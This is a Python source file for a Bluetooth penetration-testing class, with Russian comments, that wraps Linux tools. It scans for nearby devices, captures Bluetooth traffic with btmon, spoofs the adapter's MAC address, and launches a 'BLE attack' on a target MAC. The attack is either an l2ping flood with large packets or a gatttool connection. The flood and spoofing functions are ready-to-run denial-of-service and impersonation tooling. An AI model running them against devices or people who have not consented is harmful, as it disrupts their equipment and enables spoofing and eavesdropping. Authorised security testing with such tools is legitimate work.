import subprocess
import json
from typing import List, Dict
import asyncio
from datetime import datetime
from scapy.all import *

class BluetoothPentest:
    def __init__(self):
        self.active_scans = {}
        self.captured_packets = {}
        self.active_attacks = {}

    async def start_scan(self) -> Dict:
        """Запуск сканирования Bluetooth устройств"""
        try:
            # Создаем уникальный ID для сканирования
            scan_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Запускаем hcitool для сканирования
            process = subprocess.Popen([
                "hcitool",
                "scan"
            ], stdout=subprocess.PIPE)
            
            self.active_scans[scan_id] = {
                "process": process,
                "start_time": datetime.now()
            }
            
            return {
                "status": "success",
                "scan_id": scan_id,
                "message": "Bluetooth scan started"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def get_scan_results(self, scan_id: str) -> List[Dict]:
        """Получение результатов сканирования"""
        try:
            if scan_id not in self.active_scans:
                return []
                
            scan = self.active_scans[scan_id]
            output = scan["process"].communicate()[0].decode()
            devices = []
            
            for line in output.split('\n')[1:]:  # Пропускаем первую строку
                if line.strip():
                    parts = line.strip().split('\t')
                    if len(parts) >= 2:
                        devices.append({
                            "mac": parts[0].strip(),
                            "name": parts[1].strip() if len(parts) > 1 else "Unknown"
                        })
            
            return devices
        except Exception as e:
            return [{"error": str(e)}]

    async def start_packet_capture(self, mac: str = None) -> Dict:
        """Запуск захвата Bluetooth пакетов"""
        try:
            capture_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"/tmp/btcapture_{capture_id}.pcap"
            
            # Запускаем btmon для захвата пакетов
            if mac:
                process = subprocess.Popen([
                    "btmon",
                    "-w", filename,
                    mac
                ])
            else:
                process = subprocess.Popen([
                    "btmon",
                    "-w", filename
                ])
            
            self.captured_packets[capture_id] = {
                "process": process,
                "filename": filename,
                "mac": mac,
                "start_time": datetime.now()
            }
            
            return {
                "status": "success",
                "capture_id": capture_id,
                "message": "Packet capture started"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def stop_capture(self, capture_id: str) -> Dict:
        """Остановка захвата пакетов"""
        try:
            if capture_id in self.captured_packets:
                capture = self.captured_packets[capture_id]
                capture["process"].terminate()
                del self.captured_packets[capture_id]
                return {"status": "success", "message": "Capture stopped"}
            return {"status": "error", "message": "Capture not found"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def spoof_mac(self, new_mac: str) -> Dict:
        """Подмена MAC-адреса Bluetooth адаптера"""
        try:
            # Выключаем Bluetooth адаптер
            subprocess.run(["hciconfig", "hci0", "down"], check=True)
            
            # Меняем MAC-адрес
            subprocess.run(["hciconfig", "hci0", "hwaddr", new_mac], check=True)
            
            # Включаем Bluetooth адаптер
            subprocess.run(["hciconfig", "hci0", "up"], check=True)
            
            return {
                "status": "success",
                "message": f"MAC address changed to {new_mac}"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def start_ble_attack(self, target_mac: str, attack_type: str) -> Dict:
        """Запуск атаки на BLE устройство"""
        try:
            attack_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if attack_type == "flood":
                # Запуск флуд-атаки
                process = subprocess.Popen([
                    "l2ping",
                    "-i", "hci0",
                    "-s", "1000",
                    "-f",
                    target_mac
                ])
            elif attack_type == "connect":
                # Попытка подключения
                process = subprocess.Popen([
                    "gatttool",
                    "-b", target_mac,
                    "-I"
                ], stdin=subprocess.PIPE)
                process.stdin.write(b"connect\n")
                
            self.active_attacks[attack_id] = {
                "process": process,
                "type": attack_type,
                "target": target_mac,
                "start_time": datetime.now()
            }
            
            return {
                "status": "success",
                "attack_id": attack_id,
                "message": f"BLE attack ({attack_type}) started"
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def stop_attack(self, attack_id: str) -> Dict:
        """Остановка активной атаки"""
        try:
            if attack_id in self.active_attacks:
                attack = self.active_attacks[attack_id]
                attack["process"].terminate()
                del self.active_attacks[attack_id]
                return {"status": "success", "message": "Attack stopped"}
            return {"status": "error", "message": "Attack not found"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def get_active_attacks(self) -> List[Dict]:
        """Получение списка активных атак"""
        return [{
            "id": k,
            "type": v["type"],
            "target": v["target"],
            "start_time": v["start_time"].isoformat()
        } for k, v in self.active_attacks.items()] 